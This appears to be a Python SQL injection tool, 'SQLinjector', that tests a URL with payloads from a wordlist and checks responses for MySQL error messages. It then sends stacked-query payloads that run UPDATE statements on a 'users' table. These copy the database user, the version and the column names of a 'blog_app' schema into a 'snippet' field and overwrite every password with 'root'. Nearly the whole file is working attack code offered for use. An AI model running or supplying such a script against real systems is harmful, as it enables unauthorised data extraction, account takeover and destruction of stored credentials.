import requests
import sys
import getopt
import re
from termcolor import colored

def start(argv):
	if len(sys.argv) < 2:
  	   sys.exit()
	try:
		opts, args = getopt.getopt(argv,"w:i:")
	except getopt.GetoptError:
		sys.exit()
	for opt,arg in opts :
		if opt == '-w' :
			url=arg
		elif opt == '-i':
			dictio = arg
	try:
		print ("[-] Opening injections file: " + dictio)
		f = open(dictio, "r")
		name = f.read().splitlines()
	except:
		print("Failed opening file: "+ dictio+"\n")
		sys.exit()
	launcher(url,name)

def launcher (url,dictio):
	injected = []

	for x in dictio:
		sqlinjection=x
		injected.append(url.replace("FUZZ",sqlinjection))
	res = injector(injected)

	print (' Detection results:')
	for x in res:
		print (x.split(";")[0])

	detect_columns_names(url)

	print ('DB version: ')
	detect_version(url)

	print ('Current USER: ')
	detect_user(url)

	sys.exit()


def injector(injected):
	errors = ['Mysql','error in your SQL','MySQL', 'Error']
	results = []
	for y in injected:
		print ("Testing errors: " + y)
		req=requests.get(y)
		for x in errors:
			if str(req.content).find(x) != -1:
					res = y + ";" + x
					results.append(res)
	return results

def detect_user(url):
	new_url= url.replace("FUZZ","a'%20where%201=1;UPDATE%20users%20SET%20snippet=user(),password='root")
	req= requests.get(new_url)
	raw = req.content
	reg = r"\S+@\S+"
	users=re.findall(reg,str(req.content))
	for user in users:
		print (user)

def detect_version(url):
	new_url= url.replace("FUZZ","a'%20where%201=1;UPDATE%20users%20SET%20snippet=@@version,password='root")
	req=requests.get(new_url)
	raw = req.content
	reg = r"\S+ubuntu\S+"
	version=re.findall(reg,str(req.content))
	for ver in version:
		print (ver)

def detect_columns_names(url):
	new_url= url.replace("FUZZ","a';UPDATE%20users%20SET%20snippet=(select%20group_concat(COLUMN_NAME%20separator%20',')%20from%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_SCHEMA='blog_app'),password='root")
	req=requests.get(new_url)
	raw = req.content
	reg = r"\S+iconURL\S+"
	columns=re.findall(reg,str(req.content))
	print("Number of columns detected:")
	print(len(str(columns).split(',')))
	print ("Columns names found: ")
	for column in columns:
		print (column)

if __name__ == "__main__":
	try:
		start(sys.argv[1:])
	except KeyboardInterrupt:
		print ("SQLinjector interrupted by user..!!")
